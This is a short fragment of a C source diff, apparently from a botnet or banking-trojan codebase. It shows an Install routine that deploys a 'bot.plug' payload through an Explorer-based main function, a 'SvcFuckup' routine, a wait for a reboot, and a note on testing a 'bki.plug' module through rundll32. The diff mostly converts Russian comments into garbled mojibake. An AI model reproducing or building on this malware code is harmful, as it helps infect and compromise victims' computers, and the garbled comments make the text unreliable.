+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SvcFuckup
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 	if (SvcFuckupEnabled())
 	{
 		PP_DPRINTF("MyMain: SvcFuckup enabled. Run SvcFuckupRun");
@@ -1006,8 +1017,8 @@ extern"C"  BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		BOOL res = ExplorerMain( bodyBotPlug, sizeBotPlug );
 		if( res )
 		{
-			pSleep( 10 * 60 * 1000 ); //ждем перезагрузки
-			res = FALSE; //перезагрузка не произошла
+			pSleep( 10 * 60 * 1000 ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			res = FALSE; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		}
 		return res;
 	}
@@ -1016,7 +1027,7 @@ extern"C"  BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 
 DWORD WINAPI MyMain(HINSTANCE , DWORD reason, LPVOID )
 {
-//код для тестирования, ложится вместе c bot.plug и запускается "rundll32 bki.plug,qwe"
+//пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ c bot.plug пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "rundll32 bki.plug,qwe"
 //	BOT::Initialize();
 //	BYTE* data;
 //	DWORD size;
